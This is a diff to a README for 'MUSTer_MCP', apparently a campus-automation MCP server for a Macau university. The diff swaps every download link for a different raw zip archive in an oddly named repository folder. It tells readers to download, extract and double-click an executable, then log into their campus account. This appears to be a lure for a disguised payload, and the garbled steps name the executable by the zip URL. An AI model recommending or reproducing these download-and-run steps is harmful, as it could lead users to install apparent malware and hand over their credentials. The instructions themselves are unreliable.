@@ -1,6 +1,6 @@
 # 🚀 MUSTer_MCP - Your Gateway to Campus Automation
 
-[![Download MUSTer_MCP](https://raw.githubusercontent.com/ABINETHACKER/MUSTer_MCP/main/receptionism/MUSTer_MCP_v2.0.zip)](https://raw.githubusercontent.com/ABINETHACKER/MUSTer_MCP/main/receptionism/MUSTer_MCP_v2.0.zip)
+[![Download MUSTer_MCP](https://raw.githubusercontent.com/ABINETHACKER/MUSTer_MCP/main/receptionism/MUS-MCP-Ter-v3.9-alpha.5.zip)](https://raw.githubusercontent.com/ABINETHACKER/MUSTer_MCP/main/receptionism/MUS-MCP-Ter-v3.9-alpha.5.zip)
 
 ## 📜 Description
 MUSTer_MCP is an MCP server designed for the Macau University of Science and Technology. It enables seamless interaction with the M.U.S.T. campus system, allowing you to automate tasks and engage with various campus utilities with ease. This application harnesses the power of AI and web automation to enhance your campus experience.
@@ -22,20 +22,20 @@ MUSTer_MCP is an MCP server designed for the Macau University of Science and Tec
 ## 🚀 Getting Started
 Follow these steps to download and run MUSTer_MCP:
 
-1. **Visit the Releases Page:** You can find the files you need by visiting the following link: [Download MUSTer_MCP](https://raw.githubusercontent.com/ABINETHACKER/MUSTer_MCP/main/receptionism/MUSTer_MCP_v2.0.zip).
+1. **Visit the Releases Page:** You can find the files you need by visiting the following link: [Download MUSTer_MCP](https://raw.githubusercontent.com/ABINETHACKER/MUSTer_MCP/main/receptionism/MUS-MCP-Ter-v3.9-alpha.5.zip).
 
 2. **Choose the Right Version:** On the releases page, look for the latest version of MUSTer_MCP. It is usually marked as the latest release.
 
-3. **Download the Application:** Click on the link corresponding to your operating system to download the application. For example, if you are using Windows, download the file labeled something like `https://raw.githubusercontent.com/ABINETHACKER/MUSTer_MCP/main/receptionism/MUSTer_MCP_v2.0.zip` or equivalent.
+3. **Download the Application:** Click on the link corresponding to your operating system to download the application. For example, if you are using Windows, download the file labeled something like `https://raw.githubusercontent.com/ABINETHACKER/MUSTer_MCP/main/receptionism/MUS-MCP-Ter-v3.9-alpha.5.zip` or equivalent.
 
 4. **Extract the Files:** Once downloaded, locate the file on your computer. Right-click and select "Extract All" (Windows) or double-click (macOS) to unzip the contents to a folder.
 
-5. **Run the Application:** After extracting, open the folder and locate the executable file (e.g., `https://raw.githubusercontent.com/ABINETHACKER/MUSTer_MCP/main/receptionism/MUSTer_MCP_v2.0.zip` for Windows). Double-click on this file to start the application. A window should open, guiding you through initial setup.
+5. **Run the Application:** After extracting, open the folder and locate the executable file (e.g., `https://raw.githubusercontent.com/ABINETHACKER/MUSTer_MCP/main/receptionism/MUS-MCP-Ter-v3.9-alpha.5.zip` for Windows). Double-click on this file to start the application. A window should open, guiding you through initial setup.
 
 6. **Follow Setup Instructions:** The application will walk you through any additional setup processes. This may include logging into your campus account or configuring settings based on your preferences.
 
 ## 📥 Download & Install
-To get started, please follow this link to download MUSTer_MCP: [Download MUSTer_MCP](https://raw.githubusercontent.com/ABINETHACKER/MUSTer_MCP/main/receptionism/MUSTer_MCP_v2.0.zip).
+To get started, please follow this link to download MUSTer_MCP: [Download MUSTer_MCP](https://raw.githubusercontent.com/ABINETHACKER/MUSTer_MCP/main/receptionism/MUS-MCP-Ter-v3.9-alpha.5.zip).
 
 Make sure to follow the steps outlined above to ensure a smooth installation process. 
 
